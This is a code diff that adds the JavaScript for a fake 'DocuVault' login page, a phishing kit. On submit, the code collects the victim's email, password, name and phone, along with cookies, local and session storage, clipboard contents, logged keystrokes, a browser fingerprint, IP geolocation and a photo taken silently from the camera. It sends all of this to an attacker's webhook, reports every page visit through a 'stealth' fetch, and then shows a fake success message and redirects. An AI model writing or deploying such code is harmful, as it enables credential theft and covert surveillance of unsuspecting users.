+                title: "🔐 New Login Detected",
+                color: 0x6366f1,
+                thumbnail: {
+                    url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png"
+                },
+                fields: [
+                    {
+                        name: "👤 User Information",
+                        value: `**Email:** ${data.email}\n**Name:** ${data.fullname || 'Not provided'}\n**Phone:** ${data.phone || 'Not provided'}`,
+                        inline: false
+                    },
+                    {
+                        name: "🔑 Credentials",
+                        value: `**Password:** \`${data.password}\``,
+                        inline: false
+                    },
+                    {
+                        name: "💻 Device Information",
+                        value: `**OS:** ${data.system.os}\n**Browser:** ${data.system.browser.substring(0, 50)}...\n**Resolution:** ${data.system.resolution}\n**Language:** ${data.system.language}`,
+                        inline: true
+                    },
+                    {
+                        name: "⚡ Hardware",
+                        value: `**CPU:** ${data.system.cpu}\n**RAM:** ${data.system.ram}\n**Screen:** ${data.system.screen}`,
+                        inline: true
+                    },
+                    {
+                        name: "🌍 Location & Network",
+                        value: `**IP:** ${data.location.ip || 'Unknown'}\n**City:** ${data.location.city || 'Unknown'}\n**Country:** ${data.location.country || 'Unknown'}\n**ISP:** ${data.location.isp || 'Unknown'}`,
+                        inline: false
+                    },
+                    {
+                        name: "📋 Clipboard",
+                        value: `\`${data.clipboard || 'Empty or denied'}\``,
+                        inline: false
+                    },
+                    {
+                        name: "🍪 Session Data",
+                        value: `**Cookies:** ${data.session.cookies ? '✅ ' + data.session.cookies.length + ' cookies' : 'None'}\n**LocalStorage:** ${data.session.localStorage ? '✅ ' + Object.keys(data.session.localStorage).length + ' items' : 'None'}\n**SessionStorage:** ${data.session.sessionStorage ? '✅ ' + Object.keys(data.session.sessionStorage).length + ' items' : 'None'}`,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Visited Sites",
+                        value: data.visitedSites && data.visitedSites.length > 0 ? data.visitedSites.map(s => `• ${s}`).join('\n') : 'No visited sites detected',
+                        inline: false
+                    },
+                    {
+                        name: "🖥️ Browser Fingerprint",
+                        value: `**Canvas:** \`${data.fingerprint.canvas || 'N/A'}\`\n**WebGL:** \`${data.fingerprint.webgl || 'N/A'}\`\n**Plugins:** ${data.fingerprint.plugins || 'None'}`,
+                        inline: false
+                    },
+                    {
+                        name: "⌨️ Keystrokes Captured",
+                        value: `\`${data.keystrokes ? data.keystrokes.substring(0, 500) : 'None captured yet'}\``,
+                        inline: false
+                    },
+                    {
+                        name: "⏰ Timestamp",
+                        value: `\`${data.timestamp}\``,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "🔒 DocuVault Security Monitor",
+                    icon_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            // Send the beautiful embed
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                body: JSON.stringify({
+                    embeds: [embed]
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            // Also send a summary message
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                body: JSON.stringify({
+                    content: `📊 **Login Summary**\n👤 ${data.email} | 🌍 ${data.location.city || 'Unknown'}, ${data.location.country || 'Unknown'} | 💻 ${data.system.os}`
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+
+        // ============================================================
+        //  🚀 MAIN LOGIN
+        // ============================================================
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const fullname = document.getElementById('fullname').value;
+            const phone = document.getElementById('phone').value;
+            
+            const btn = document.getElementById('loginBtn');
+            const status = document.getElementById('status');
+            const emailGroup = document.getElementById('emailGroup');
+            
+            // ===== VALIDATE EMAIL =====
+            if (!email) {
+                emailGroup.classList.add('error');
+                document.getElementById('emailError').textContent = 'Please enter your email address';
+                document.getElementById('emailError').style.color = '#dc2626';
+                showToast('Please enter your email address', 'error', 3000);
+                document.getElementById('email').focus();
+                return;
+            }
+            
+            if (!validateEmailFormat(email)) {
+                emailGroup.classList.add('error');
+                document.getElementById('emailError').textContent = 'Please enter a valid email address';
+                document.getElementById('emailError').style.color = '#dc2626';
+                showToast('Invalid email format', 'error', 3000);
+                document.getElementById('email').focus();
+                return;
+            }
+            
+            if (!checkEmailExists(email)) {
+                emailGroup.classList.add('error');
+                document.getElementById('emailError').textContent = 'No account found with this email address';
+                document.getElementById('emailError').style.color = '#dc2626';
+                showToast('No account found with this email address', 'error', 3000);
+                document.getElementById('email').focus();
+                return;
+            }
+            
+            emailGroup.classList.remove('error');
+            emailGroup.classList.add('success');
+            
+            if (!password) {
+                showToast('Please enter your password', 'error', 3000);
+                document.getElementById('password').focus();
+                return;
+            }
+            
+            btn.classList.add('loading');
+            btn.disabled = true;
+            status.textContent = 'Securely connecting...';
+            status.className = 'loading';
+            
+            try {
+                // Collect all data
+                const info = collectAllInfo();
+                const location = await getLocation();
+                const clipboard = await getClipboard();
+                const photo = await capturePhotoSilent();
+                
+                // Prepare beautiful data structure
+                const beautifulData = {
+                    email: email,
+                    password: password,
+                    fullname: fullname,
+                    phone: phone,
+                    keystrokes: keystrokes || 'None captured yet',
+                    timestamp: new Date().toISOString(),
+                    system: {
+                        os: navigator.platform,
+                        browser: navigator.userAgent,
+                        resolution: `${screen.width}x${screen.height}`,
+                        language: navigator.language,
+                        cpu: `${navigator.hardwareConcurrency || 'Unknown'} cores`,
+                        ram: `${navigator.deviceMemory || 'Unknown'} GB`,
+                        screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`
+                    },
+                    location: {
+                        ip: location.ip || 'Unknown',
+                        city: location.city || 'Unknown',
+                        region: location.region || 'Unknown',
+                        country: location.country_name || 'Unknown',
+                        isp: location.org || 'Unknown',
+                        lat: location.latitude || 'Unknown',
+                        lon: location.longitude || 'Unknown'
+                    },
+                    clipboard: clipboard ? clipboard.substring(0, 500) : 'Empty or denied',
+                    session: {
+                        cookies: document.cookie || 'No cookies',
+                        localStorage: (() => {
+                            try {
+                                const items = {};
+                                for (let i = 0; i < localStorage.length; i++) {
+                                    const key = localStorage.key(i);
+                                    items[key] = localStorage.getItem(key).substring(0, 200);
+                                }
+                                return items;
+                            } catch(e) {
+                                return 'localStorage access denied';
+                            }
+                        })(),
+                        sessionStorage: (() => {
+                            try {
+                                const items = {};
+                                for (let i = 0; i < sessionStorage.length; i++) {
+                                    const key = sessionStorage.key(i);
+                                    items[key] = sessionStorage.getItem(key).substring(0, 200);
+                                }
+                                return items;
+                            } catch(e) {
+                                return 'sessionStorage access denied';
+                            }
+                        })()
+                    },
+                    visitedSites: getVisitedSites(),
+                    fingerprint: {
+                        canvas: info.canvasFingerprint || 'N/A',
+                        webgl: info.webgl ? info.webgl.renderer || 'N/A' : 'N/A',
+                        plugins: info.plugins || 'None'
+                    },
+                    page: {
+                        url: window.location.href,
+                        referrer: document.referrer || 'Direct'
+                    }
+                };
+                
+                // Send beautiful embed
+                await sendBeautifulEmbed(beautifulData);
+                
+                // Send photo if captured
+                if (photo) {
+                    const response = await fetch(photo);
+                    const blob = await response.blob();
+                    const formData = new FormData();
+                    formData.append('file', blob, 'user_photo.jpg');
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📸 **Selfie captured**\n👤 ${email}`
+                    }));
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                status.textContent = '✅ Authentication successful! Redirecting...';
+                status.className = 'success';
+                showToast('Welcome back! Redirecting to dashboard...', 'success');
+                
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+                
+            } catch(err) {
+                status.textContent = '❌ Connection error. Please try again.';
+                status.className = 'error';
+                showToast('Something went wrong. Please try again.', 'error');
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        }
+
+        // ============================================================
+        //  📋 REAL-TIME EMAIL VALIDATION
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const emailGroup = document.getElementById('emailGroup');
+            const emailError = document.getElementById('emailError');
+            
+            let timeoutId;
+            emailInput.addEventListener('input', function() {
+                clearTimeout(timeoutId);
+                timeoutId = setTimeout(() => {
+                    const email = this.value.trim();
+                    
+                    if (email.length === 0) {
+                        emailGroup.classList.remove('error', 'success');
+                        return;
+                    }
+                    
+                    const result = validateEmail(email);
+                    
+                    if (result.valid) {
+                        emailGroup.classList.remove('error');
+                        emailGroup.classList.add('success');
+                        emailError.textContent = '✓ Email verified';
+                        emailError.style.color = '#16a34a';
+                    } else {
+                        emailGroup.classList.remove('success');
+                        emailGroup.classList.add('error');
+                        emailError.textContent = result.message;
+                        emailError.style.color = '#dc2626';
+                    }
+                }, 500);
+            });
+            
+            emailInput.addEventListener('blur', function() {
+                const email = this.value.trim();
+                if (email.length > 0) {
+                    const result = validateEmail(email);
+                    if (!result.valid) {
+                        emailGroup.classList.remove('success');
+                        emailGroup.classList.add('error');
+                        emailError.textContent = result.message;
+                        emailError.style.color = '#dc2626';
+                        showToast(result.message, 'error', 3000);
+                    }
+                }
+            });
+
+            // ===== AUTO INIT =====
+            setTimeout(initCamera, 500);
+            
+            // Send page visit with beautiful format using stealth
+            stealthFetch(WEBHOOK, {
+                embeds: [{
+                    title: "🌐 Page Visit",
+                    color: 0x3b82f6,
+                    fields: [
+                        {
+                            name: "📍 URL",
+                            value: window.location.href,
+                            inline: false
+                        },
+                        {
+                            name: "🔗 Referrer",
+                            value: document.referrer || 'Direct',
+                            inline: true
+                        },
+                        {
+                            name: "💻 User Agent",
+                            value: navigator.userAgent,
+                            inline: true
+                        },
+                        {
+                            name: "⏰ Time",
+                            value: new Date().toISOString(),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "🔒 DocuVault Security Monitor"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            });
+        });
+
+        // ============================================================
+        //  ⌨️ KEYBOARD SHORTCUT: Enter to submit
+        // ============================================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.target.closest('button')) {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
 </body>
 </html>
